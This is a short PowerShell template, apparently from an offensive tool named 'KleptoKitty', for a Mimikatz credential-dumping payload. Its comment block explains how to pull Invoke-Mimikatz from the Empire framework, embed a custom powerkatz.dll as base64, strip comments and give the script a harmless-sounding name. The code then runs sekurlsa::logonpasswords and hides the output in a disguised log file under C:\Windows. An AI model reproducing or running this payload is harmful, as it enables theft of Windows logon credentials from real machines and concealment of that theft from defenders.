<#

     =^._.^=
    _(      )/  KleptoKitty

    How to build payload:

    1.	Get Invoke-Mimikatz from Empire Framework
    	https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/
    
    2.	Use Mimikatz in script or replace it by your own version
    	Build Mimikatz from code (Target Second_Release_PowerShell), convert powerkatz.dll to base64 and replace $PEBytes32 and $PEBytes64
   
    3.	Strip comments and use a harmless-sounding name for the script
#>

Function FormerlyKnownAsMimikatz {
    # <add the script here>
}

# Log
$TargetBasePath = "Windows"
$TargetLogName = "de-ch.log"
$TargetLogLocalPath = "C:\$TargetBasePath\$TargetLogName"

# Run Payload
FormerlyKnownAsMimikatz -Command """log $TargetLogLocalPath"" privilege::debug sekurlsa::logonpasswords"
